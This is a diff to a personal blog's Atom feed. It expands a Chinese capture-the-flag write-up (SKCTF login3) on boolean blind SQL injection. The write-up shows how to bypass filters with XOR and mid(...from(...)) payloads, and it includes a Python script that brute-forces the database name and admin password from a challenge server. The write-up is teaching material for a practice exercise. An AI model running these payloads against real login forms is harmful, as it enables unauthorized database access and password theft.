@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-05T19:45:39+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">login3(SKCTF)</title><link href="http://localhost:4000/2018/08/05/bk_login3/" rel="alternate" type="text/html" title="login3(SKCTF)" /><published>2018-08-05T00:00:00+08:00</published><updated>2018-08-05T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/05/bk_login3</id><content type="html" xml:base="http://localhost:4000/2018/08/05/bk_login3/">&lt;p&gt;一道 SQL 注入的题目，里面有不少绕过的技巧，值得好好来分析一下。&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.3">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2018-08-05T23:49:16+08:00</updated><id>http://localhost:4000/</id><title type="html">Evil</title><subtitle>Catcher's blog</subtitle><author><name>Catcher</name></author><entry><title type="html">login3(SKCTF)</title><link href="http://localhost:4000/2018/08/05/bk_login3/" rel="alternate" type="text/html" title="login3(SKCTF)" /><published>2018-08-05T00:00:00+08:00</published><updated>2018-08-05T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/05/bk_login3</id><content type="html" xml:base="http://localhost:4000/2018/08/05/bk_login3/">&lt;p&gt;一道 SQL 注入的题目，里面有不少绕过的技巧，值得好好来分析一下。&lt;/p&gt;
 
 &lt;!--more--&gt;
 
@@ -19,7 +19,104 @@
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;select username, password from users where username='XXX'
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;根据以上分析，我们其实可以根据回显的不同进行布尔盲注。&lt;/p&gt;</content><author><name>Catcher</name></author><summary type="html">一道 SQL 注入的题目，里面有不少绕过的技巧，值得好好来分析一下。</summary></entry><entry><title type="html">当我谈跑步时，我谈些什么</title><link href="http://localhost:4000/2018/08/05/tpb/" rel="alternate" type="text/html" title="当我谈跑步时，我谈些什么" /><published>2018-08-05T00:00:00+08:00</published><updated>2018-08-05T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/05/tpb</id><content type="html" xml:base="http://localhost:4000/2018/08/05/tpb/">&lt;blockquote&gt;
+&lt;p&gt;根据以上分析，我们其实可以根据回显的不同进行布尔盲注。&lt;/p&gt;
+
+&lt;h3 id=&quot;step2-布尔盲注测试&quot;&gt;step2: 布尔盲注测试&lt;/h3&gt;
+
+&lt;p&gt;在进行布尔盲注测试的时候会发现这里过滤了一些字符(回显为&lt;code class=&quot;highlighter-rouge&quot;&gt;illegal character&lt;/code&gt;)，这里过滤了&lt;code class=&quot;highlighter-rouge&quot;&gt;and 空格 逗号 等号 for information&lt;/code&gt;。这里最精华的地方就是对这些过滤进行绕过：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;and&lt;/code&gt; &amp;lt;—&amp;gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;^&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;等号&lt;/code&gt; &amp;lt;—&amp;gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;lt;&amp;gt;&lt;/code&gt;（这里也可以用减号，看相减之后是否为 0，然后进行异或）&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;mid(xxx,from 1 for 1)&lt;/code&gt; (for 和逗号被过滤)&amp;lt;—&amp;gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ascii()&lt;/code&gt;(如果传入一个字符串那么就会取第一个字符的ascii码值)&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;下面就是按照 SQL 注入的一般套路来：
+&lt;strong&gt;1.先查询数据库名&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin'^(ascii(mid(database()from(1)))&amp;lt;&amp;gt;1)#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;注：&lt;/strong&gt;&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mid() 和 substring() 相同:
+mid(xxx,1,1)
+mid(xxx,from 1 for 1)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;根据以上分析，我们可以构造暴破数据库名的脚本，首先 payload 为：&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin'^(ascii(mid(database()from(1)))&amp;lt;&amp;gt;1)^0#
+或
+admin'^(ascii(mid(database()from(1)))&amp;lt;&amp;gt;1)#
+或
+admin'^(ascii(substring(database()from(1)))&amp;lt;&amp;gt;1)#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#encoding: utf-8&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;string&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;session&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://118.89.219.210:49167/index.php&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;digits&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lowercase&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# payload = &quot;admin'^(ascii(mid(database()from(1)))&amp;lt;&amp;gt;1)^0#&quot;&lt;/span&gt;
+
+
+&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;get_database&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;30&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+		&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+			&lt;span class=&quot;c&quot;&gt;#上面三个 payload 任意一个都行&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;admin'^(ascii(substring(database()from({})))&amp;lt;&amp;gt;{})#&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ord&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+				&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+				&lt;span class=&quot;s&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;admin&quot;&lt;/span&gt;
+			&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+			&lt;span class=&quot;n&quot;&gt;response&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base_url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;error&quot;&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;response&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;
+				&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+			&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+				&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;database&lt;/span&gt;
+
+
+&lt;span class=&quot;n&quot;&gt;get_database&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# blindsql&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;strong&gt;2.查询表名&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;因为这里 &lt;code class=&quot;highlighter-rouge&quot;&gt;information&lt;/code&gt; 被过滤了，按照原来的套路来就不行了。那应该怎么办呢？看别人的 writeup 说是猜测这里所要查询的表名是 admin，然后验证一下是否存在这样一个表&lt;code class=&quot;highlighter-rouge&quot;&gt;admin’^(select(1)from(admin))^1#&lt;/code&gt;如果存在，那么回显&lt;code class=&quot;highlighter-rouge&quot;&gt;password error!&lt;/code&gt;。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;这里要着重解释一下为什么在之前的 payload 和这里后面要多加一个&lt;code class=&quot;highlighter-rouge&quot;&gt;^1&lt;/code&gt;或&lt;code class=&quot;highlighter-rouge&quot;&gt;^0&lt;/code&gt;。&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;如果这里不在后面加&lt;code class=&quot;highlighter-rouge&quot;&gt;^1&lt;/code&gt;，那么不管&lt;code class=&quot;highlighter-rouge&quot;&gt;(select(1)from(admin))&lt;/code&gt;对或错都会回显&lt;code class=&quot;highlighter-rouge&quot;&gt;username does not exist!&lt;/code&gt;。因为如果存在 &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; 的话那么就是 &lt;code class=&quot;highlighter-rouge&quot;&gt;1^1=0&lt;/code&gt;会回显&lt;code class=&quot;highlighter-rouge&quot;&gt;username does not exist!&lt;/code&gt; ；如果不存在 &lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt;，那么就会报错，报错在这里会回显&lt;code class=&quot;highlighter-rouge&quot;&gt;username does not exist!&lt;/code&gt;。加了&lt;code class=&quot;highlighter-rouge&quot;&gt;^1&lt;/code&gt;就很好的解决了这个问题，可以区分报错与正确。之前的 payload 也是为了防止这个问题。&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;因为’admin’^0^0和’admin’^1^1是一样的，我们可以构造后者来看前者成立时的情况。因为这里语法错误也不会报错，有可能你输入的语句就不可能成立，但你也不知道，就很麻烦了，不过可以改变最后是^0还是^1，如果改与不改返回值相同，那就是有语法错误。&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;[这里猜测外别的方法我暂时不知道。⭐️]&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;3.查询字段名&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;其实这里不需要查，因为我们还是猜测这里的字段名为&lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;，这个没啥可说的。然后我们稍微验证一下&lt;code class=&quot;highlighter-rouge&quot;&gt;admin'^(select(count(password))from(admin))^1#&lt;/code&gt;，回显&lt;code class=&quot;highlighter-rouge&quot;&gt;password error!&lt;/code&gt;，说明是存在&lt;code class=&quot;highlighter-rouge&quot;&gt;pasword&lt;/code&gt;字段的。&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;4.暴破目标数据&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;payload:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;admin'^(ascii(mid((select(password)from(admin))from(1)))&amp;lt;&amp;gt;97)^0#
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;脚本跟之前的差不多，就不放了。&lt;/p&gt;</content><author><name>Catcher</name></author><summary type="html">一道 SQL 注入的题目，里面有不少绕过的技巧，值得好好来分析一下。</summary></entry><entry><title type="html">当我谈跑步时，我谈些什么</title><link href="http://localhost:4000/2018/08/05/tpb/" rel="alternate" type="text/html" title="当我谈跑步时，我谈些什么" /><published>2018-08-05T00:00:00+08:00</published><updated>2018-08-05T00:00:00+08:00</updated><id>http://localhost:4000/2018/08/05/tpb</id><content type="html" xml:base="http://localhost:4000/2018/08/05/tpb/">&lt;blockquote&gt;
   &lt;p&gt;“每天跑步对我来说好比生命线，不能说忙就抛开不管，或者停下不跑了。忙就中断跑步的话，我一辈子都无法跑步了。坚持跑步的理由不过一丝半点，中断跑步的理由却足够装满一辆大型载重卡车。我们只有将那「一丝半点的理由」一个个慎之又慎地不断打磨，见缝插针，得空就孜孜不倦地打磨他们。”   —村上春树&lt;/p&gt;
 &lt;/blockquote&gt;
 
